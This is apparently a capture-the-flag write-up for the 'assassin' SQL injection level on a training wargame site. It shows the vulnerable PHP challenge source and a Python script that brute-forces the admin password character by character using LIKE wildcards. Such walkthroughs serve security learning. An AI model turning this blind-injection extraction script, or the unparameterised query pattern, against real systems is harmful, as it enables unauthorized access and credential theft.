# assassin

----------

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

Here they use `like` , so we can ty just putting a `%` which will replace all characters . But we get `Hello guest` as guest is in the top of the table.

Now we can find the the admins password but  still the first few characters of admin is same as that of guets and we will get `Hello guest` as output only. So i made a script to find the password :

```python
import requests
import string

session = requests.Session()

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw={}%'
cookies = {"PHPSESSID": "lmscmn6uu5q675j19npln84ik4"}
pw = ""
for j in range(8):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "_#*%"):
            print('a',i)
            j= i
            break
        if('Hello guest' in r.text[:200] and i not in "_#*%"):
            print('g',i)
            j= i
    pw+=j
    print("Password :", pw)
print("Password :", pw)
```

It gave the password as `902efd10` and giving that as the value of `pw` solved the level
